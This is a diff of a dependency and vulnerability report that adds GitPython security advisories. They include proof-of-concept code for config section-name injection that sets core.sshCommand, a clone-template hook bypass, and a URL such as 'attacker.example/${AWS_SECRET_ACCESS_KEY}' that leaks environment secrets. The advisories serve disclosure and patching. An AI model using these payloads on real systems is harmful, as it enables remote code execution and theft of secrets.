@@ -227,16 +227,6 @@
         },
         {
           "package": {
-            "name": "backports-tarfile",
-            "version": "1.2.0",
-            "ecosystem": "PyPI"
-          },
-          "licenses": [
-            "MIT"
-          ]
-        },
-        {
-          "package": {
             "name": "base58",
             "version": "2.1.1",
             "ecosystem": "PyPI"
@@ -656,6 +646,16 @@
         },
         {
           "package": {
+            "name": "deprecation",
+            "version": "2.1.0",
+            "ecosystem": "PyPI"
+          },
+          "licenses": [
+            "Apache-2.0"
+          ]
+        },
+        {
+          "package": {
             "name": "diff-cover",
             "version": "10.2.0",
             "ecosystem": "PyPI"
@@ -672,6 +672,16 @@
           },
           "licenses": [
             "BSD-3-Clause"
+          ]
+        },
+        {
+          "package": {
+            "name": "dirhash",
+            "version": "0.5.0",
+            "ecosystem": "PyPI"
+          },
+          "licenses": [
+            "MIT"
           ]
         },
         {
@@ -906,6 +916,16 @@
         },
         {
           "package": {
+            "name": "genai-prices",
+            "version": "0.0.62",
+            "ecosystem": "PyPI"
+          },
+          "licenses": [
+            "MIT"
+          ]
+        },
+        {
+          "package": {
             "name": "gitdb",
             "version": "4.0.12",
             "ecosystem": "PyPI"
@@ -1102,6 +1122,546 @@
               }
             },
             {
+              "modified": "2026-07-25T21:44:40Z",
+              "published": "2026-07-24T16:22:02Z",
+              "schema_version": "1.7.5",
+              "id": "GHSA-3rp5-jjmw-4wv2",
+              "related": [
+                "CGA-qwpj-22m5-gv5h"
+              ],
+              "summary": "GitPython: git-config section-name injection enables arbitrary config directives (core.sshCommand RCE)",
+              "details": "### Summary\n\nIn GitPython `<= 3.1.52`, the config writer neutralizes only CR, LF, and NUL in configuration **names**, but writes section names into the `[...]` header with no other escaping. A section/subsection name that contains `] [ \"` closes the intended header and opens a second same-line section, injecting an arbitrary config directive \u2014 with no newline required. Because a submodule **name** is attacker-controlled data (it comes from a repository's `.gitmodules`, or from an application that lets a user name a submodule) and is written verbatim into the parent repository's trusted `.git/config`, an attacker can set `core.sshCommand` (or `alias.*`, `core.pager`, `core.fsmonitor`) and achieve remote code execution on the victim's next git operation. Likely **CWE-74 (Injection)**.\n\nThis is a distinct variant of the injection addressed by GHSA-mv93-w799-cj2w / GHSA-v87r-6q3f-2j67: those fixed **newline** injection into config values/names (patched in 3.1.50); the `[r\\n\\x00]` guard added for them does not stop a **same-line** section break inside a name.\n\n### Details\n\nThe only guard applied to section/option names before writing is `_assure_config_name_safe`, which uses a regex that matches solely CR/LF/NUL:\n\n`git/config.py:75,897-899` (`GitPython 3.1.52`):\n\n```python\nUNSAFE_CONFIG_CHARS_RE = re.compile(r\"[\\r\\n\\x00]\")\n...\ndef _assure_config_name_safe(self, name: \"cp._SectionName\", label: str) -> None:\n    if isinstance(name, str) and UNSAFE_CONFIG_CHARS_RE.search(name):\n        raise ValueError(\"Git config %s names must not contain CR, LF, or NUL\" % label)\n```\n\nThe name is then serialized into the header with no escaping of `]`, `[`, `\"`, space, `=` or `#`:\n\n`git/config.py:693`:\n\n```python\nfp.write((\"[%s]\\n\" % name).encode(defenc))\n```\n\nFor submodules the name is wrapped as `submodule \"<name>\"` (`git/objects/submodule/util.py:39`, `return f'submodule \"{name}\"'`), which supplies the balancing quote. A submodule named:\n\n```\nx\"] [core] sshCommand=CMD #\n```\n\ntherefore serializes to the header `[submodule \"x\"] [core] sshCommand=CMD #\"]`. git parses everything after the first `]` on that line as a fresh section, yielding `core.sshCommand=CMD` (the trailing `#\"]` is an inline comment). No CR/LF/NUL appears, so `_assure_config_name_safe` never fires.\n\nThe attacker-controlled name reaches this sink through documented public entry points that write it into the parent repository's `.git/config`:\n\n- `Repo.create_submodule(name=<untrusted>, ...)` \u2192 `Submodule.add` \u2192 `git/objects/submodule/base.py:619` `writer.set_value(sm_section(name), \"url\", url)` \u2014 a single call, no hostile remote required.\n- `Repo.clone_from(<hostile url>)` + `repo.submodule_update(init=True)` \u2192 `git/objects/submodule/base.py:855` `writer.set_value(sm_section(self.name), \"url\", self.url)`, where `self.name` is read unvalidated from the cloned repo's `.gitmodules`.\n\nAsymmetry: the sibling class is blocked \u2014 a newline in a config **value**, e.g. `set_value(\"core\", \"editor\", \"x\\n\\tsshCommand=CMD\")`, raises `ValueError`. The section-**name** bracket payload is not caught by the same guard.\n\n### PoC\n\nSingle self-contained script, run against the pinned release in an ephemeral environment. Non-destructive: the injected value is an inert marker, verified parse-only with `git config --get`; no ssh/fetch/push is run and nothing is executed.\n\n```python\n#!/usr/bin/env python3\n\"\"\"Minimal PoC: git-config section-name injection in GitPython==3.1.52.\"\"\"\nfrom importlib.metadata import version\nimport os, tempfile, subprocess\nimport git\n\nprint(f\"# GitPython {version('GitPython')}\")        # version proof -- first line\n\nMARKER = \"MARKER_9f3a\"                               # inert; never executed\ntmp = tempfile.mkdtemp()\nenv = {**os.environ, \"HOME\": tmp,\n       \"GIT_CONFIG_GLOBAL\": os.path.join(tmp, \"gc\"), \"GIT_CONFIG_SYSTEM\": os.devnull,\n       \"GIT_AUTHOR_NAME\": \"a\", \"GIT_AUTHOR_EMAIL\": \"a@b.c\",\n       \"GIT_COMMITTER_NAME\": \"a\", \"GIT_COMMITTER_EMAIL\": \"a@b.c\"}\n\ndef run(*a, cwd=None):\n    return subprocess.run(a, cwd=cwd, env=env, capture_output=True, text=True)\n\n# A benign local repo used as the submodule url (a plain path, no network).\nsrc = os.path.join(tmp, \"src\"); os.makedirs(src)\nrun(\"git\", \"init\", \"-q\", src)\nopen(os.path.join(src, \"f\"), \"w\").write(\"x\")\nrun(\"git\", \"add\", \"f\", cwd=src); run(\"git\", \"commit\", \"-qm\", \"i\", cwd=src)\nsuburl = os.path.join(tmp, \"sub.git\"); run(\"git\", \"clone\", \"-q\", \"--bare\", src, suburl)\n\ndef parent_repo():\n    p = tempfile.mkdtemp(dir=tmp)\n    run(\"git\", \"init\", \"-q\", p)\n    open(os.path.join(p, \"r\"), \"w\").write(\"x\")\n    run(\"git\", \"add\", \"r\", cwd=p); run(\"git\", \"commit\", \"-qm\", \"i\", cwd=p)\n    return p\n\ndef injected_sshcommand(parent):\n    r = run(\"git\", \"config\", \"-f\", os.path.join(parent, \".git\", \"config\"),\n            \"--get\", \"core.sshCommand\")\n    return (r.returncode, r.stdout.strip())\n\nbenign = \"docs\"\nevil   = f'x\"] [core] sshCommand={MARKER} #'          # closes the header, opens [core]\n\np_control = parent_repo()\ngit.Repo(p_control).create_submodule(name=benign, path=\"docs\", url=suburl)\np_exploit = parent_repo()\ngit.Repo(p_exploit).create_submodule(name=evil, path=\"sub\", url=suburl)\n\nctl = injected_sshcommand(p_control)\nexp = injected_sshcommand(p_exploit)\nheader = [l for l in open(os.path.join(p_exploit, \".git\", \"config\")).read().splitlines()\n          if l.startswith(\"[submodule\")][0]\n\nprint(\"control name :\", repr(benign))\nprint(\"  git core.sshCommand ->\", ctl, \"(unset)\")\nprint(\"exploit name :\", repr(evil))\nprint(\"  written header      ->\", header)\nprint(\"  git core.sshCommand ->\", exp)\n\nassert ctl[0] != 0 and ctl[1] == \"\", \"control unexpectedly set core.sshCommand\"\nassert exp == (0, MARKER), \"not reproduced\"\nprint(f\"VERDICT: attacker-controlled submodule name injected core.sshCommand={MARKER} \"\n      f\"into the victim's trusted .git/config (git would run it on the next ssh op)\")\n```\n\nRun:\n\n```bash\nuv run --with GitPython==3.1.52 python poc.py\n```\n\nObserved output:\n\n```\n# GitPython 3.1.52\ncontrol name : 'docs'\n  git core.sshCommand -> (1, '') (unset)\nexploit name : 'x\"] [core] sshCommand=MARKER_9f3a #'\n  written header      -> [submodule \"x\"] [core] sshCommand=MARKER_9f3a #\"]\n  git core.sshCommand -> (0, 'MARKER_9f3a')\nVERDICT: attacker-controlled submodule name injected core.sshCommand=MARKER_9f3a into the victim's trusted .git/config (git would run it on the next ssh op)\n```\n\nThe benign name yields a single clean `[submodule \"docs\"]` section; the malicious name yields an injected `core.sshCommand`. Deterministic across runs. The payload must use balanced double-quotes (an unbalanced `\"` makes git reject the header); the `submodule \"<name>\"` wrapper balances them automatically.\n\n### Impact\n\nArbitrary attacker-controlled write into the victim's repository-local `.git/config`, which git fully trusts. `core.sshCommand` is executed as the ssh transport command on the victim's next ssh git operation (fetch/pull/push), giving remote code execution; other injectable keys (`alias.*`, `core.pager`, `core.fsmonitor`) fire on more common operations. Reachable in default configuration through two realistic paths:\n\n- an application that constructs a submodule from untrusted input via `Repo.create_submodule(name=...)` (single call); or\n- `Repo.clone_from` of an untrusted repository followed by `submodule_update` \u2014 the canonical submodule threat model, where the malicious name is read from the cloned `.gitmodules`.\n\nNo non-default git settings are required. Primarily a Unix vector: on Windows the `\"` in the resulting `.git/modules/<name>` directory name can abort the fresh-clone write branch (the direct config-API and `create_submodule` sinks are unaffected).\n\n### Recommended fix\n\nReject or escape configuration section/subsection/option **names** that contain `]`, `[`, `\"`, or leading/trailing whitespace (or apply git's own section-name escaping) in `_assure_config_name_safe` / `write_section`, rather than only CR/LF/NUL. Validating submodule names before they reach `sm_section` would additionally close the clone-driven path.",
+              "severity": [
+                {
+                  "type": "CVSS_V3",
+                  "score": "CVSS:3.1/AV:L/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:H"
+                }
+              ],
+              "affected": [
+                {
+                  "package": {
+                    "ecosystem": "PyPI",
+                    "name": "gitpython",
+                    "purl": "pkg:pypi/gitpython"
+                  },
+                  "ranges": [
+                    {
+                      "type": "ECOSYSTEM",
+                      "events": [
+                        {
+                          "introduced": "0"
+                        },
+                        {
+                          "fixed": "3.1.53"
+                        }
+                      ]
+                    }
+                  ],
+                  "versions": [
+                    "0.1.7",
+                    "0.2.0-beta1",
+                    "0.3.0-beta1",
+                    "0.3.0-beta2",
+                    "0.3.1-beta2",
+                    "0.3.2",
+                    "0.3.2.1",
+                    "0.3.2.RC1",
+                    "0.3.3",
+                    "0.3.4",
+                    "0.3.5",
+                    "0.3.6",
+                    "0.3.7",
+                    "1.0.0",
+                    "1.0.1",
+                    "1.0.2",
+                    "2.0.0",
+                    "2.0.1",
+                    "2.0.2",
+                    "2.0.3",
+                    "2.0.4",
+                    "2.0.5",
+                    "2.0.6",
+                    "2.0.7",
+                    "2.0.8",
+                    "2.0.9",
+                    "2.0.9.dev0",
+                    "2.0.9.dev1",
+                    "2.1.0",
+                    "2.1.1",
+                    "2.1.10",
+                    "2.1.11",
+                    "2.1.12",
+                    "2.1.13",
+                    "2.1.14",
+                    "2.1.15",
+                    "2.1.2",
+                    "2.1.3",
+                    "2.1.4",
+                    "2.1.5",
+                    "2.1.6",
+                    "2.1.7",
+                    "2.1.8",
+                    "2.1.9",
+                    "3.0.0",
+                    "3.0.1",
+                    "3.0.2",
+                    "3.0.3",
+                    "3.0.4",
+                    "3.0.5",
+                    "3.0.6",
+                    "3.0.7",
+                    "3.0.8",
+                    "3.0.9",
+                    "3.1.0",
+                    "3.1.1",
+                    "3.1.10",
+                    "3.1.11",
+                    "3.1.12",
+                    "3.1.13",
+                    "3.1.14",
+                    "3.1.15",
+                    "3.1.16",
+                    "3.1.17",
+                    "3.1.18",
+                    "3.1.19",
+                    "3.1.2",
+                    "3.1.20",
+                    "3.1.22",
+                    "3.1.23",
+                    "3.1.24",
+                    "3.1.25",
+                    "3.1.26",
+                    "3.1.27",
+                    "3.1.28",
+                    "3.1.29",
+                    "3.1.3",
+                    "3.1.30",
+                    "3.1.31",
+                    "3.1.32",
+                    "3.1.33",
+                    "3.1.34",
+                    "3.1.35",
+                    "3.1.36",
+                    "3.1.37",
+                    "3.1.38",
+                    "3.1.4",
+                    "3.1.40",
+                    "3.1.41",
+                    "3.1.42",
+                    "3.1.43",
+                    "3.1.44",
+                    "3.1.45",
+                    "3.1.46",
+                    "3.1.47",
+                    "3.1.48",
+                    "3.1.49",
+                    "3.1.5",
+                    "3.1.50",
+                    "3.1.51",
+                    "3.1.52",
+                    "3.1.6",
+                    "3.1.7",
+                    "3.1.8",
+                    "3.1.9"
+                  ],
+                  "database_specific": {
+                    "last_known_affected_version_range": "<= 3.1.52",
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/07/GHSA-3rp5-jjmw-4wv2/GHSA-3rp5-jjmw-4wv2.json"
+                  }
+                }
+              ],
+              "references": [
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/gitpython-developers/GitPython/security/advisories/GHSA-3rp5-jjmw-4wv2"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/gitpython-developers/GitPython/commit/1ed1b924f4e2d2ee7bab296df77b978af21853f1"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/gitpython-developers/GitPython"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/gitpython-developers/GitPython/releases/tag/3.1.53"
+                }
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-74"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2026-07-24T16:22:02Z",
+                "nvd_published_at": null,
+                "severity": "HIGH"
+              }
+            },
+            {
+              "modified": "2026-07-25T21:44:40Z",
+              "published": "2026-07-24T16:42:09Z",
+              "schema_version": "1.7.5",
+              "id": "GHSA-6p8h-3wgx-97gf",
+              "related": [
+                "CGA-6wgq-qprv-c8vg"
+              ],
+              "summary": "GitPython: Incomplete unsafe_git_clone_options denylist omits --template enabling arbitrary command execution via clone hooks",
+              "details": "## Summary\nGitPython's `unsafe_git_clone_options` denylist omits `--template`. `git clone --template=<dir>` copies `<dir>/hooks/` into the new repository and runs them (`post-checkout` fires during clone), so a caller who can influence clone options can achieve arbitrary command execution in the default `allow_unsafe_options=False` configuration.\n\n## Root Cause\n`base.py:145-152` defines `unsafe_git_clone_options = [\"--upload-pack\",\"-u\",\"--config\",\"-c\"]` \u2014 `--template` is absent. The guard candidate `['--template']` passes `check_unsafe_options` (verified). git copies the hook directory and executes `post-checkout` at checkout time. git's `protocol.allow`/`GIT_ALLOW_PROTOCOL` do not gate `--template`; the incomplete denylist is the only defense.\n\n## Impact\nArbitrary OS command execution during clone (default config). Requires an attacker-readable directory containing an executable hook \u2014 a genuine second precondition (realistic via shared filesystems, upload dirs, `/tmp`, or attacker-writable network paths), reflected as AC:H.\n\n## Proof of Concept\n```python\n# attacker stages <dir>/hooks/post-checkout (chmod +x)\nfrom git import Repo\nRepo.clone_from(src, dst, template='<dir>')   # post-checkout hook executes -> marker created (verified)\n```\n\n## Attack Chain\n1. Setup: attacker stages `<dir>/hooks/post-checkout` (chmod +x). Guard: n/a (filesystem).\n2. Entry: `Repo.clone_from(url, path, template='<dir>')`. Guard: `check_unsafe_options(candidates=['--template'], unsafe=unsafe_git_clone_options)`. Bypass proof: `--template` not on the denylist -> passes (verified candidate `['--template']`, no error).\n3. Sink: git copies the hook and executes `post-checkout` at checkout. Impact: ACE, default config (verified marker created).\n\n## Bypass Evidence\nLive-verified on HEAD (tag 3.1.53): guard candidate `['--template']` passed with no error; staged `post-checkout` hook executed during `clone_from`, creating the marker. Independent of the value-smuggle bypass (`--template` is a legitimate long option that survives any single-char-value fix). Not covered by any existing advisory.\n\n## Affected Versions\n`<= 3.1.53`\n\n## Suggested Fix\nAdd `--template` (and audit for other hook/exec-influencing options) to `unsafe_git_clone_options`.\n\n---\nReported by **zx (Jace)** \u2014 GitHub: @manus-use",
+              "severity": [
+                {
+                  "type": "CVSS_V3",
+                  "score": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H"
+                }
+              ],
+              "affected": [
+                {
+                  "package": {
+                    "ecosystem": "PyPI",
+                    "name": "gitpython",
+                    "purl": "pkg:pypi/gitpython"
+                  },
+                  "ranges": [
+                    {
+                      "type": "ECOSYSTEM",
+                      "events": [
+                        {
+                          "introduced": "0"
+                        },
+                        {
+                          "fixed": "3.1.54"
+                        }
+                      ]
+                    }
+                  ],
+                  "versions": [
+                    "0.1.7",
+                    "0.2.0-beta1",
+                    "0.3.0-beta1",
+                    "0.3.0-beta2",
+                    "0.3.1-beta2",
+                    "0.3.2",
+                    "0.3.2.1",
+                    "0.3.2.RC1",
+                    "0.3.3",
+                    "0.3.4",
+                    "0.3.5",
+                    "0.3.6",
+                    "0.3.7",
+                    "1.0.0",
+                    "1.0.1",
+                    "1.0.2",
+                    "2.0.0",
+                    "2.0.1",
+                    "2.0.2",
+                    "2.0.3",
+                    "2.0.4",
+                    "2.0.5",
+                    "2.0.6",
+                    "2.0.7",
+                    "2.0.8",
+                    "2.0.9",
+                    "2.0.9.dev0",
+                    "2.0.9.dev1",
+                    "2.1.0",
+                    "2.1.1",
+                    "2.1.10",
+                    "2.1.11",
+                    "2.1.12",
+                    "2.1.13",
+                    "2.1.14",
+                    "2.1.15",
+                    "2.1.2",
+                    "2.1.3",
+                    "2.1.4",
+                    "2.1.5",
+                    "2.1.6",
+                    "2.1.7",
+                    "2.1.8",
+                    "2.1.9",
+                    "3.0.0",
+                    "3.0.1",
+                    "3.0.2",
+                    "3.0.3",
+                    "3.0.4",
+                    "3.0.5",
+                    "3.0.6",
+                    "3.0.7",
+                    "3.0.8",
+                    "3.0.9",
+                    "3.1.0",
+                    "3.1.1",
+                    "3.1.10",
+                    "3.1.11",
+                    "3.1.12",
+                    "3.1.13",
+                    "3.1.14",
+                    "3.1.15",
+                    "3.1.16",
+                    "3.1.17",
+                    "3.1.18",
+                    "3.1.19",
+                    "3.1.2",
+                    "3.1.20",
+                    "3.1.22",
+                    "3.1.23",
+                    "3.1.24",
+                    "3.1.25",
+                    "3.1.26",
+                    "3.1.27",
+                    "3.1.28",
+                    "3.1.29",
+                    "3.1.3",
+                    "3.1.30",
+                    "3.1.31",
+                    "3.1.32",
+                    "3.1.33",
+                    "3.1.34",
+                    "3.1.35",
+                    "3.1.36",
+                    "3.1.37",
+                    "3.1.38",
+                    "3.1.4",
+                    "3.1.40",
+                    "3.1.41",
+                    "3.1.42",
+                    "3.1.43",
+                    "3.1.44",
+                    "3.1.45",
+                    "3.1.46",
+                    "3.1.47",
+                    "3.1.48",
+                    "3.1.49",
+                    "3.1.5",
+                    "3.1.50",
+                    "3.1.51",
+                    "3.1.52",
+                    "3.1.53",
+                    "3.1.6",
+                    "3.1.7",
+                    "3.1.8",
+                    "3.1.9"
+                  ],
+                  "database_specific": {
+                    "last_known_affected_version_range": "<= 3.1.53",
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/07/GHSA-6p8h-3wgx-97gf/GHSA-6p8h-3wgx-97gf.json"
+                  }
+                }
+              ],
+              "references": [
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/gitpython-developers/GitPython/security/advisories/GHSA-6p8h-3wgx-97gf"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/gitpython-developers/GitPython/pull/2180"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/gitpython-developers/GitPython/commit/ffcb5359e87619f4fe4a70a4aff5f08c5580ba97"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/gitpython-developers/GitPython"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/gitpython-developers/GitPython/releases/tag/3.1.54"
+                }
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-184",
+                  "CWE-78"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2026-07-24T16:42:09Z",
+                "nvd_published_at": null,
+                "severity": "HIGH"
+              }
+            },
+            {
+              "modified": "2026-07-25T21:44:41Z",
+              "published": "2026-07-24T21:45:16Z",
+              "schema_version": "1.7.5",
+              "id": "GHSA-94p4-4cq8-9g67",
+              "related": [
+                "CGA-64fm-w89x-q4q7"
+              ],
+              "summary": "GitPython: Environment-variable exfiltration via Repo.create_remote() / Remote.add() URL (incomplete fix of GHSA-rwj8-pgh3-r573)",
+              "details": "## Summary\n\nThe fix for [GHSA-rwj8-pgh3-r573](https://github.com/gitpython-developers/GitPython/security/advisories/GHSA-rwj8-pgh3-r573) stopped `Repo.clone_from()` from running caller-supplied URLs through `os.path.expandvars()`, but it guarded only that one caller. `Remote.create()` \u2014 reached from the public `Repo.create_remote()` and its `Remote.add()` alias \u2014 still passes an attacker-influenceable URL through `Git.polish_url()` with the default `expand_vars=True`. A URL such as `http://attacker.example/${AWS_SECRET_ACCESS_KEY}/repo.git` is expanded server-side to embed the hosting process's environment secret, written into `.git/config`, and then transmitted to the attacker's host on the next `fetch`/`pull`. This is the same primitive and same \"import repository from URL\" threat model the advisory describes, via the sibling caller the fix missed.\n\n## Root Cause\n\nFix commit [`8ac5a305`](https://github.com/gitpython-developers/GitPython/commit/8ac5a30519b6f4af85398b9b9d7064ff4d452da2) added an `expand_vars` parameter to `Git.polish_url()` (default `True`) and used `expand_vars=False` only in `Repo._clone()` ([`git/repo/base.py:1455`](https://github.com/gitpython-developers/GitPython/blob/3.1.53/git/repo/base.py#L1455)). The shared helper's dangerous default was left in place, and the other callers were not updated.\n\n[`git/remote.py:811`](https://github.com/gitpython-developers/GitPython/blob/3.1.53/git/remote.py#L811), `Remote.create`:\n\n```python\nurl = Git.polish_url(url)                 # expand_vars=True -> os.path.expandvars(url)\nif not allow_unsafe_protocols:\n    Git.check_unsafe_protocols(url)       # https:// carrying the secret passes\nrepo.git.remote(scmd, \"--\", name, url, **kwargs)   # expanded URL written to .git/config\n```\n\n`check_unsafe_protocols()` runs *after* expansion here, so it rejects an `ext::` payload but does nothing about an `https://` URL that carries an expanded secret in its path or host \u2014 the disclosure primitive.\n\nThe same unguarded call also sits at [`git/objects/submodule/base.py:611`](https://github.com/gitpython-developers/GitPython/blob/3.1.53/git/objects/submodule/base.py#L611) (`Submodule.add`), which writes the expanded URL into `.gitmodules` (a tracked file) and `.git/config`.\n\n## Steps to Reproduce\n\n### Prerequisites\n\n- Python 3.9+\n- `git` on `PATH` (for the fetch step)\n- GitPython 3.1.53 (installed below)\n\n### Step 1: Install GitPython 3.1.53 in a clean venv\n\n```bash\nmkdir /tmp/gp-remote-poc && cd /tmp/gp-remote-poc\npython3 -m venv venv\n./venv/bin/pip install gitpython==3.1.53\n```\n\n### Step 2: Write the PoC\n\n```bash\ncat > poc.py <<'PYEOF'\n#!/usr/bin/env python3\n\"\"\"Env-var exfiltration via Repo.create_remote() URL. Sentinel data only.\"\"\"\nimport http.server\nimport os\nimport tempfile\nimport threading\n\nimport git\n\nprint(\"gitpython version:\", git.__version__)\n\n# Sentinel standing in for a process secret such as AWS_SECRET_ACCESS_KEY.\nSENTINEL = \"leaked-a1b2c3-SENTINEL-do-not-use\"\nos.environ[\"GP_SENTINEL_SECRET\"] = SENTINEL\n\n# Local HTTP server standing in for attacker.example.\ncaptured = []\n\n\nclass Handler(http.server.BaseHTTPRequestHandler):\n    def do_GET(self):\n        captured.append(self.path)\n        self.send_response(404)\n        self.end_headers()\n\n    def log_message(self, *a):\n        pass\n\n\nsrv = http.server.HTTPServer((\"127.0.0.1\", 0), Handler)\nport = srv.server_address[1]\nthreading.Thread(target=srv.serve_forever, daemon=True).start()\n\n# Attacker-controlled URL handed to an \"import from URL\" feature.\nattacker_url = \"http://127.0.0.1:%d/steal/${GP_SENTINEL_SECRET}/repo.git\" % port\n\n\ndef norm(s):  # display the ephemeral listener port as a stable placeholder\n    return s.replace(\"127.0.0.1:%d\" % port, \"127.0.0.1:PORT\")\n\n\nprint(\"attacker-supplied URL :\", norm(attacker_url))\n\nrepo = git.Repo.init(tempfile.mkdtemp(prefix=\"gp-victim-\"))\nremote = repo.create_remote(\"evil\", attacker_url)   # public API\n\nstored = repo.remote(\"evil\").url\nprint(\"stored remote URL     :\", norm(stored))\nprint(\"SENTINEL in git config:\", SENTINEL in stored)\n\ntry:\n    remote.fetch()          # transmits the expanded URL to the attacker host\nexcept Exception:\n    pass                    # fetch fails after the request is already sent\n\nsrv.shutdown()\nover_network = any(SENTINEL in p for p in captured)\nprint(\"HTTP paths received   :\", [norm(p) for p in captured])\nprint(\"SENTINEL over network :\", over_network)\n\nprint()\nif SENTINEL in stored and over_network:\n    print(\"VULNERABLE: env-var expanded into stored URL AND transmitted to attacker host\")\nelif SENTINEL in stored:\n    print(\"VULNERABLE: env-var expanded into stored git-config URL\")\nelse:\n    print(\"not reproduced\")\nPYEOF\n```\n\n### Step 3: Run it\n\n```bash\ncd /tmp/gp-remote-poc && ./venv/bin/python poc.py\n```\n\nExpected output (the listener's ephemeral port is shown as `PORT`):\n\n```\ngitpython version: 3.1.53\nattacker-supplied URL : http://127.0.0.1:PORT/steal/${GP_SENTINEL_SECRET}/repo.git\nstored remote URL     : http://127.0.0.1:PORT/steal/leaked-a1b2c3-SENTINEL-do-not-use/repo.git\nSENTINEL in git config: True\nHTTP paths received   : ['/steal/leaked-a1b2c3-SENTINEL-do-not-use/repo.git/info/refs?service=git-upload-pack']\nSENTINEL over network : True\n\nVULNERABLE: env-var expanded into stored URL AND transmitted to attacker host\n```\n\nThe `${GP_SENTINEL_SECRET}` token in the supplied URL is replaced with the environment value both in the stored `.git/config` URL and in the request that reaches the attacker-controlled host.\n\n## Suggested Fix\n\nPass `expand_vars=False` at the remaining URL callers, matching the clone fix:\n\n- `git/remote.py` `Remote.create`: `url = Git.polish_url(url, expand_vars=False)`\n- `git/objects/submodule/base.py` `Submodule.add`: `url = Git.polish_url(url, expand_vars=False)`\n\nMore robustly, flip the `Git.polish_url()` default to `expand_vars=False` (env-var expansion on a URL is never desirable for network remotes) and require callers that genuinely normalize local paths to opt in.\n\n## Cleanup\n\n```bash\nrm -rf /tmp/gp-remote-poc\n```\n\n## Impact\n\nAny secret in the hosting process environment (`AWS_SECRET_ACCESS_KEY`, `GITHUB_TOKEN`, CI/CD tokens) is disclosed to an attacker who controls a remote URL passed to `Repo.create_remote()` / `Remote.add()`. The secret is expanded into `.git/config` immediately and transmitted over the network (DNS + HTTP) on the next `fetch`/`pull`/`remote update`. This is the documented \"import repository from URL\" attacker model of GHSA-rwj8-pgh3-r573 \u2014 CI servers, git-hosting mirrors, and dependency scanners \u2014 applied to the add-a-remote flow, which the clone-only fix did not cover. The same disclosure reaches `.gitmodules` (a committable file) via `Submodule.add()`.",
+              "severity": [
+                {
+                  "type": "CVSS_V3",
+                  "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"
+                }
+              ],
+              "affected": [
+                {
+                  "package": {
+                    "ecosystem": "PyPI",
+                    "name": "gitpython",
+                    "purl": "pkg:pypi/gitpython"
+                  },
+                  "ranges": [
+                    {
+                      "type": "ECOSYSTEM",
+                      "events": [
+                        {
+                          "introduced": "0"
+                        },
+                        {
+                          "fixed": "3.1.55"
+                        }
+                      ]
+                    }
+                  ],
+                  "versions": [
+                    "0.1.7",
+                    "0.2.0-beta1",
+                    "0.3.0-beta1",
+                    "0.3.0-beta2",
+                    "0.3.1-beta2",
+                    "0.3.2",
+                    "0.3.2.1",
+                    "0.3.2.RC1",
+                    "0.3.3",
+                    "0.3.4",
+                    "0.3.5",
+                    "0.3.6",
+                    "0.3.7",
+                    "1.0.0",
+                    "1.0.1",
+                    "1.0.2",
+                    "2.0.0",
+                    "2.0.1",
+                    "2.0.2",
+                    "2.0.3",
+                    "2.0.4",
+                    "2.0.5",
+                    "2.0.6",
+                    "2.0.7",
+                    "2.0.8",
+                    "2.0.9",
+                    "2.0.9.dev0",
+                    "2.0.9.dev1",
+                    "2.1.0",
+                    "2.1.1",
+                    "2.1.10",
+                    "2.1.11",
+                    "2.1.12",
+                    "2.1.13",
+                    "2.1.14",
+                    "2.1.15",
+                    "2.1.2",
+                    "2.1.3",
+                    "2.1.4",
+                    "2.1.5",
+                    "2.1.6",
+                    "2.1.7",
+                    "2.1.8",
+                    "2.1.9",
+                    "3.0.0",
+                    "3.0.1",
+                    "3.0.2",
+                    "3.0.3",
+                    "3.0.4",
+                    "3.0.5",
+                    "3.0.6",
+                    "3.0.7",
+                    "3.0.8",
+                    "3.0.9",
+                    "3.1.0",
+                    "3.1.1",
+                    "3.1.10",
+                    "3.1.11",
+                    "3.1.12",
+                    "3.1.13",
+                    "3.1.14",
+                    "3.1.15",
+                    "3.1.16",
+                    "3.1.17",
+                    "3.1.18",
+                    "3.1.19",
+                    "3.1.2",
+                    "3.1.20",
+                    "3.1.22",
+                    "3.1.23",
+                    "3.1.24",
+                    "3.1.25",
+                    "3.1.26",
+                    "3.1.27",
+                    "3.1.28",
+                    "3.1.29",
+                    "3.1.3",
+                    "3.1.30",
+                    "3.1.31",
+                    "3.1.32",
+                    "3.1.33",
+                    "3.1.34",
+                    "3.1.35",
+                    "3.1.36",
+                    "3.1.37",
+                    "3.1.38",
+                    "3.1.4",
+                    "3.1.40",
+                    "3.1.41",
+                    "3.1.42",
+                    "3.1.43",
+                    "3.1.44",
+                    "3.1.45",
+                    "3.1.46",
+                    "3.1.47",
+                    "3.1.48",
+                    "3.1.49",
+                    "3.1.5",
+                    "3.1.50",
+                    "3.1.51",
+                    "3.1.52",
+                    "3.1.53",
+                    "3.1.54",
+                    "3.1.6",
+                    "3.1.7",
+                    "3.1.8",
+                    "3.1.9"
+                  ],
+                  "database_specific": {
+                    "last_known_affected_version_range": "<= 3.1.53",
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/07/GHSA-94p4-4cq8-9g67/GHSA-94p4-4cq8-9g67.json"
+                  }
+                }
+              ],
+              "references": [
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/gitpython-developers/GitPython/security/advisories/GHSA-94p4-4cq8-9g67"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/gitpython-developers/GitPython/commit/863417457a0633db7ea5aed4fd01e0b291a41162"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/gitpython-developers/GitPython"
+                },
+                {
